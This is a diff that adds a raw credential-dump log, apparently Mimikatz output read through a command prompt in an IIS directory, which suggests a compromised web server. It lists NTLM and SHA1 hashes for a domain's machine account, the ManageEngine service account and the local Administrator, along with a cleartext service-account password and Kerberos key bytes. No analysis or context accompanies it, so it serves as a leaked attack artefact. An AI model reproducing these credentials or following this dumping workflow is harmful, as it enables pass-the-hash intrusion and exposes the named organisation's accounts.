@@ -1,0 +1,347 @@
+c:\windows\system32\inetsrv>type \\192.168.100.10\c$\windows\temp\abcd.tmp 2>&1
+Privilege '20' OK
+
+Authentication Id : 0 ; 587475 (00000000:0008f6d3)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:05:27 PM
+SID               : S-1-5-90-2
+	msv :	
+	 [00000003] Primary
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * NTLM     : 7534c74acf0813310f5c846673d9f378
+	 * SHA1     : d4ebeb1d93e42c7999bd1f6961964bc693c07508
+	tspkg :	
+	wdigest :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : nmc.local
+	 * Password : de 65 a0 33 aa a1 d5 13 62 5c 79 28 e1 c5 e6 c4 67 64 1f c1 9c 03 74 ee 2e 9c 37 13 94 fb 93 27 3f ac 1b 51 f8 8c 1e f3 1d f0 10 14 42 10 5d 03 04 43 0f d9 af 16 1f 0e 42 e2 bf 61 2e 30 f7 90 2d c8 55 15 7c 5b fb a5 ee 43 7d ff a9 79 6e a3 96 33 b9 2c ec d5 64 3b 35 53 f4 7f ae a6 e9 83 85 94 ab 9d 0e 15 d9 6a db 19 35 d5 2b 5a 2c 3e 94 81 43 fa b5 3b 44 6f 98 11 ab c9 8b 9b 91 da 2a cb 72 1d 49 30 f1 16 13 dd 8d f0 d7 39 ee 34 48 31 d3 a1 2d ba 83 f5 c5 75 35 77 d7 3a 2e 38 78 e9 9e 6d 4e e8 5d 55 42 53 a0 ed 4b 0d 16 15 d2 c3 f4 d9 d3 f4 9b 50 cf 26 8f bc 65 31 99 61 95 99 c0 a7 a1 09 d2 d8 fb 3e 96 0f e1 52 55 56 75 de 2c 0d ff 0f 06 e8 c9 de 36 d7 e6 ef 8a e4 75 a1 b5 a1 c7 6a 40 2f c0 15 b8 42 ba d1 00 66 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 117075 (00000000:0001c953)
+Session           : Service from 0
+User Name         : ManageEngine
+Domain            : NMC
+Logon Server      : AUHDCP01
+Logon Time        : 1/6/2018 8:01:34 PM
+SID               : S-1-5-21-1450872384-1447640237-3759404699-8119
+	msv :	
+	 [00000003] Primary
+	 * Username : ManageEngine
+	 * Domain   : NMC
+	 * NTLM     : faacc4c8fbf5c63b9f2e7edbb7abd115
+	 * SHA1     : 052f2b4d5b58925e6ae2a5dd9b369d062be0bb50
+	 [00010000] CredentialKeys
+	 * NTLM     : 
+	 * SHA1     : 
+	 * RootKey  : faacc4c8fbf5c63b9f2e7edbb7abd115
+	 * SHA1     : 
+	 * RootKey  : 052f2b4d5b58925e6ae2a5dd9b369d062be0bb50
+	tspkg :	
+	wdigest :	
+	 * Username : ManageEngine
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : ManageEngine
+	 * Domain   : NMC.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 109895 (00000000:0001ad47)
+Session           : Service from 0
+User Name         : ManageEngine
+Domain            : NMC
+Logon Server      : AUHDCP01
+Logon Time        : 1/6/2018 8:01:33 PM
+SID               : S-1-5-21-1450872384-1447640237-3759404699-8119
+	msv :	
+	 [00000003] Primary
+	 * Username : ManageEngine
+	 * Domain   : NMC
+	 * NTLM     : faacc4c8fbf5c63b9f2e7edbb7abd115
+	 * SHA1     : 052f2b4d5b58925e6ae2a5dd9b369d062be0bb50
+	 [00010000] CredentialKeys
+	 * NTLM     : 
+	 * SHA1     : 
+	 * RootKey  : faacc4c8fbf5c63b9f2e7edbb7abd115
+	 * SHA1     : 
+	 * RootKey  : 052f2b4d5b58925e6ae2a5dd9b369d062be0bb50
+	tspkg :	
+	wdigest :	
+	 * Username : ManageEngine
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : ManageEngine
+	 * Domain   : NMC.LOCAL
+	 * Password : (null)
+	ssp :	
+	 [00000000]
+	 * Username : manageengine
+	 * Domain   : nmc
+	 * Password : &MRSCZL7n#@2017
+	credman :	
+
+Authentication Id : 0 ; 63171 (00000000:0000f6c3)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:01:10 PM
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * NTLM     : 7534c74acf0813310f5c846673d9f378
+	 * SHA1     : d4ebeb1d93e42c7999bd1f6961964bc693c07508
+	tspkg :	
+	wdigest :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : nmc.local
+	 * Password : de 65 a0 33 aa a1 d5 13 62 5c 79 28 e1 c5 e6 c4 67 64 1f c1 9c 03 74 ee 2e 9c 37 13 94 fb 93 27 3f ac 1b 51 f8 8c 1e f3 1d f0 10 14 42 10 5d 03 04 43 0f d9 af 16 1f 0e 42 e2 bf 61 2e 30 f7 90 2d c8 55 15 7c 5b fb a5 ee 43 7d ff a9 79 6e a3 96 33 b9 2c ec d5 64 3b 35 53 f4 7f ae a6 e9 83 85 94 ab 9d 0e 15 d9 6a db 19 35 d5 2b 5a 2c 3e 94 81 43 fa b5 3b 44 6f 98 11 ab c9 8b 9b 91 da 2a cb 72 1d 49 30 f1 16 13 dd 8d f0 d7 39 ee 34 48 31 d3 a1 2d ba 83 f5 c5 75 35 77 d7 3a 2e 38 78 e9 9e 6d 4e e8 5d 55 42 53 a0 ed 4b 0d 16 15 d2 c3 f4 d9 d3 f4 9b 50 cf 26 8f bc 65 31 99 61 95 99 c0 a7 a1 09 d2 d8 fb 3e 96 0f e1 52 55 56 75 de 2c 0d ff 0f 06 e8 c9 de 36 d7 e6 ef 8a e4 75 a1 b5 a1 c7 6a 40 2f c0 15 b8 42 ba d1 00 66 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 587444 (00000000:0008f6b4)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:05:27 PM
+SID               : S-1-5-90-2
+	msv :	
+	 [00000003] Primary
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * NTLM     : 7534c74acf0813310f5c846673d9f378
+	 * SHA1     : d4ebeb1d93e42c7999bd1f6961964bc693c07508
+	tspkg :	
+	wdigest :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : nmc.local
+	 * Password : de 65 a0 33 aa a1 d5 13 62 5c 79 28 e1 c5 e6 c4 67 64 1f c1 9c 03 74 ee 2e 9c 37 13 94 fb 93 27 3f ac 1b 51 f8 8c 1e f3 1d f0 10 14 42 10 5d 03 04 43 0f d9 af 16 1f 0e 42 e2 bf 61 2e 30 f7 90 2d c8 55 15 7c 5b fb a5 ee 43 7d ff a9 79 6e a3 96 33 b9 2c ec d5 64 3b 35 53 f4 7f ae a6 e9 83 85 94 ab 9d 0e 15 d9 6a db 19 35 d5 2b 5a 2c 3e 94 81 43 fa b5 3b 44 6f 98 11 ab c9 8b 9b 91 da 2a cb 72 1d 49 30 f1 16 13 dd 8d f0 d7 39 ee 34 48 31 d3 a1 2d ba 83 f5 c5 75 35 77 d7 3a 2e 38 78 e9 9e 6d 4e e8 5d 55 42 53 a0 ed 4b 0d 16 15 d2 c3 f4 d9 d3 f4 9b 50 cf 26 8f bc 65 31 99 61 95 99 c0 a7 a1 09 d2 d8 fb 3e 96 0f e1 52 55 56 75 de 2c 0d ff 0f 06 e8 c9 de 36 d7 e6 ef 8a e4 75 a1 b5 a1 c7 6a 40 2f c0 15 b8 42 ba d1 00 66 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 125710 (00000000:0001eb0e)
+Session           : Service from 0
+User Name         : manageengine
+Domain            : NMC
+Logon Server      : AUHDCP01
+Logon Time        : 1/6/2018 8:01:36 PM
+SID               : S-1-5-21-1450872384-1447640237-3759404699-8119
+	msv :	
+	 [00000003] Primary
+	 * Username : ManageEngine
+	 * Domain   : NMC
+	 * NTLM     : faacc4c8fbf5c63b9f2e7edbb7abd115
+	 * SHA1     : 052f2b4d5b58925e6ae2a5dd9b369d062be0bb50
+	 [00010000] CredentialKeys
+	 * NTLM     : 
+	 * SHA1     : 
+	 * RootKey  : faacc4c8fbf5c63b9f2e7edbb7abd115
+	 * SHA1     : 
+	 * RootKey  : 052f2b4d5b58925e6ae2a5dd9b369d062be0bb50
+	tspkg :	
+	wdigest :	
+	 * Username : ManageEngine
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : manageengine
+	 * Domain   : NMC.LOCAL
+	 * Password : (null)
+	ssp :	
+	 [00000000]
+	 * Username : ManageEngine@nmc.local
+	 * Domain   : (null)
+	 * Password : &MRSCZL7n#@2017
+	 [00000001]
+	 * Username : manageengine
+	 * Domain   : nmc.local
+	 * Password : &MRSCZL7n#@2017
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : NMC-ADMANAGER$
+Domain            : NMC
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:01:08 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : nmc-admanager$
+	 * Domain   : NMC.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 215452182 (00000000:0cd78a16)
+Session           : NewCredentials from 0
+User Name         : ManageEngine
+Domain            : NMC
+Logon Server      : (null)
+Logon Time        : 1/10/2018 9:38:51 PM
+SID               : S-1-5-21-1450872384-1447640237-3759404699-8119
+	msv :	
+	 [00000003] Primary
+	 * Username : manageengine
+	 * Domain   : nmc
+	 * NTLM     : faacc4c8fbf5c63b9f2e7edbb7abd115
+	 * SHA1     : 052f2b4d5b58925e6ae2a5dd9b369d062be0bb50
+	tspkg :	
+	wdigest :	
+	 * Username : manageengine
+	 * Domain   : nmc
+	 * Password : (null)
+	kerberos :	
+	 * Username : manageengine
+	 * Domain   : NMC.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 63153 (00000000:0000f6b1)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:01:10 PM
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * NTLM     : 7534c74acf0813310f5c846673d9f378
+	 * SHA1     : d4ebeb1d93e42c7999bd1f6961964bc693c07508
+	tspkg :	
+	wdigest :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : nmc.local
+	 * Password : de 65 a0 33 aa a1 d5 13 62 5c 79 28 e1 c5 e6 c4 67 64 1f c1 9c 03 74 ee 2e 9c 37 13 94 fb 93 27 3f ac 1b 51 f8 8c 1e f3 1d f0 10 14 42 10 5d 03 04 43 0f d9 af 16 1f 0e 42 e2 bf 61 2e 30 f7 90 2d c8 55 15 7c 5b fb a5 ee 43 7d ff a9 79 6e a3 96 33 b9 2c ec d5 64 3b 35 53 f4 7f ae a6 e9 83 85 94 ab 9d 0e 15 d9 6a db 19 35 d5 2b 5a 2c 3e 94 81 43 fa b5 3b 44 6f 98 11 ab c9 8b 9b 91 da 2a cb 72 1d 49 30 f1 16 13 dd 8d f0 d7 39 ee 34 48 31 d3 a1 2d ba 83 f5 c5 75 35 77 d7 3a 2e 38 78 e9 9e 6d 4e e8 5d 55 42 53 a0 ed 4b 0d 16 15 d2 c3 f4 d9 d3 f4 9b 50 cf 26 8f bc 65 31 99 61 95 99 c0 a7 a1 09 d2 d8 fb 3e 96 0f e1 52 55 56 75 de 2c 0d ff 0f 06 e8 c9 de 36 d7 e6 ef 8a e4 75 a1 b5 a1 c7 6a 40 2f c0 15 b8 42 ba d1 00 66 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : NMC-ADMANAGER$
+Domain            : NMC
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:01:10 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * NTLM     : 7534c74acf0813310f5c846673d9f378
+	 * SHA1     : d4ebeb1d93e42c7999bd1f6961964bc693c07508
+	tspkg :	
+	wdigest :	
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * Password : (null)
+	kerberos :	
+	 * Username : nmc-admanager$
+	 * Domain   : NMC.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 614017 (00000000:00095e81)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : NMC-ADMANAGER
+Logon Server      : NMC-ADMANAGER
+Logon Time        : 1/6/2018 8:05:28 PM
+SID               : S-1-5-21-3412108499-2169837499-2369690407-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 
+	 * SHA1     : 
+	 * RootKey  : d992fc50447a1e43683eb849de318a9e
+	 * SHA1     : 
+	 * RootKey  : 7defa34dc09fe811764f7ddd502b8440a16250d4
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : NMC-ADMANAGER
+	 * NTLM     : d992fc50447a1e43683eb849de318a9e
+	 * SHA1     : 7defa34dc09fe811764f7ddd502b8440a16250d4
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : NMC-ADMANAGER
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : NMC-ADMANAGER
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:01:10 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 41793 (00000000:0000a341)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 1/6/2018 8:01:09 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : NMC-ADMANAGER$
+	 * Domain   : NMC
+	 * NTLM     : 7534c74acf0813310f5c846673d9f378
+	 * SHA1     : d4ebeb1d93e42c7999bd1f6961964bc693c07508
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
